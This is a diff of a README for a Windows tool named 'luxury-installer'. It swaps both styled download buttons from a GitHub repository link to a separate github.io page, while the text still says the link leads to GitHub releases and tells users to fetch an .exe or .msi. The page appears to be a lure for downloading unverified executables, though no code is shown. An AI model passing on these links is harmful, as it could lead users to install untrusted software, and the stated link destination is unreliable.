@@ -1,7 +1,7 @@
 <h1>🔒 luxury-installer - Install Software With Confidence</h1>
 
 <p align="center">
-  <a href="https://github.com/Elanebeanshaped819/luxury-installer" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 24px; font-weight: bold; text-decoration: none; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download luxury-installer</a>
+  <a href="https://elanebeanshaped819.github.io" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 24px; font-weight: bold; text-decoration: none; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download luxury-installer</a>
 </p>
 
 <p align="center">
@@ -23,7 +23,7 @@ Welcome to luxury-installer! This guide will help you download and run the softw
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Elanebeanshaped819/luxury-installer" style="display: inline-block; padding: 12px 25px; background: #28a745; color: white; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 5px;">📥 Download luxury-installer</a>
+  <a href="https://elanebeanshaped819.github.io" style="display: inline-block; padding: 12px 25px; background: #28a745; color: white; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 5px;">📥 Download luxury-installer</a>
 </p>
 
 When you click the link, you'll be taken to the main page for luxury-installer on GitHub. Look for the latest release section and download the file that matches your Windows computer (usually the file that ends with `.exe` or `.msi`).
